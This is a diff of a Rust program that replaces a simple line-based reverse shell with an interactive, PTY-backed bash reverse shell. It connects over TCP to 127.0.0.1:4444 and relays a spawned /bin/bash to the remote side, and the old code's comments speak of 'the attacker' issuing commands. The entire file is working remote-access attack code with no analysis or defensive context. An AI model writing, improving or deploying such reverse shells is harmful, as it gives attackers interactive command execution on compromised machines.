@@ -1,59 +1,67 @@
-use std::io::{BufRead, BufReader, Write}; // specific imports are cleaner
-use std::net::TcpStream;
-use std::process::Command;
+use tokio::{
+    net::TcpStream as TokioTcpStream,
+    io::{AsyncReadExt, AsyncWriteExt}, // We use raw Read/Write, not BufRead/Line
+};
+use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
+use std::io::{Read, Write}; // Standard sync IO traits for the PTY
 
-fn main() -> std::io::Result<()> {
-    // 1. Establish connection
-    let stream = match TcpStream::connect("127.0.0.1:4444") {
-        Ok(s) => s,
-        Err(e) => {
-            eprintln!("Failed to connect: {}", e);
-            return Err(e);
-        }
-    };
-
-    // 2. Clone the handle for writing
-    // We clone the internal socket reference so we can read and write independently
-    let mut stream_writer = stream.try_clone()?;
+#[tokio::main]
+async fn main() -> std::io::Result<()> {
+    let stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
     
-    // 3. Wrap the ORIGINAL stream in a BufReader for easy line reading
-    let mut reader = BufReader::new(&stream);
+    // Split TCP into Read/Write
+    let (mut tcp_reader, mut tcp_writer) = stream.into_split();
+
+    // Setup PTY
+    let pty_system = NativePtySystem::default();
+    let pty_pair = pty_system.openpty(PtySize {
+        rows: 24, cols: 80, pixel_width: 0, pixel_height: 0,
+    }).expect("Failed to create PTY");
+
+    let mut _cmd = CommandBuilder::new("/bin/bash");
+    _cmd.env("TERM", "xterm-256color");
+    let _bash = pty_pair.slave.spawn_command(_cmd).expect("Failed to spawn shell");
+
+    // Get PTY handles (Blocking!)
+    let mut pty_reader = pty_pair.master.try_clone_reader().unwrap();
+    let mut pty_writer = pty_pair.master.take_writer().unwrap();
+
+    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
+
+    tokio::task::spawn_blocking(move || {
+        let mut buf = [0u8; 4096];
+        loop {
+            // This blocks until Bash has output
+            match pty_reader.read(&mut buf) {
+                Ok(n) if n > 0 => {
+                    // Send the data to the main async loop
+                    let _ = tx.blocking_send(buf[..n].to_vec());
+                }
+                _ => break, // EOF or error
+            }
+        }
+    });
+
+    let mut tcp_buf = [0u8; 4096];
 
     loop {
-        let mut cmd = String::new();
-        // Read until the attacker hits Enter
-        match reader.read_line(&mut cmd) {
-            Ok(0) => break, // EOF (Connection closed)
-            Ok(_) => {
-                let cmd = cmd.trim();
-                // Skip empty commands (just hitting enter)
-                if cmd.is_empty() { continue; }
-
-                let output = Command::new("/bin/sh")
-                    .arg("-c")
-                    .arg(cmd)
-                    .output();
-
-                match output {
-                    Ok(out) => {
-                        // Write directly to the stream (no BufWriter needed)
-                        stream_writer.write_all(&out.stdout)?;
-                        stream_writer.write_all(&out.stderr)?;
-                        // No need to flush usually, but good practice to ensure it sends NOW
-                        stream_writer.flush()?; 
+        tokio::select! {
+            result = tcp_reader.read(&mut tcp_buf) => {
+                match result {
+                    Ok(n) if n > 0 => {
+                        pty_writer.write_all(&tcp_buf[..n])?;
+                        pty_writer.flush()?; 
                     }
-                    Err(e) => {
-                        // If the process failed to start (e.g., /bin/sh missing)
-                        let error_msg = format!("Failed to execute: {}\n", e);
-                        stream_writer.write_all(error_msg.as_bytes())?;
-                    }
+                    _ => break,
                 }
             }
-            Err(e) => {
-                eprintln!("Connection error: {}", e);
-                break;
+
+            Some(data) = rx.recv() => {
+                tcp_writer.write_all(&data).await?;
+                tcp_writer.flush().await?;
             }
         }
     }
+
     Ok(())
 }
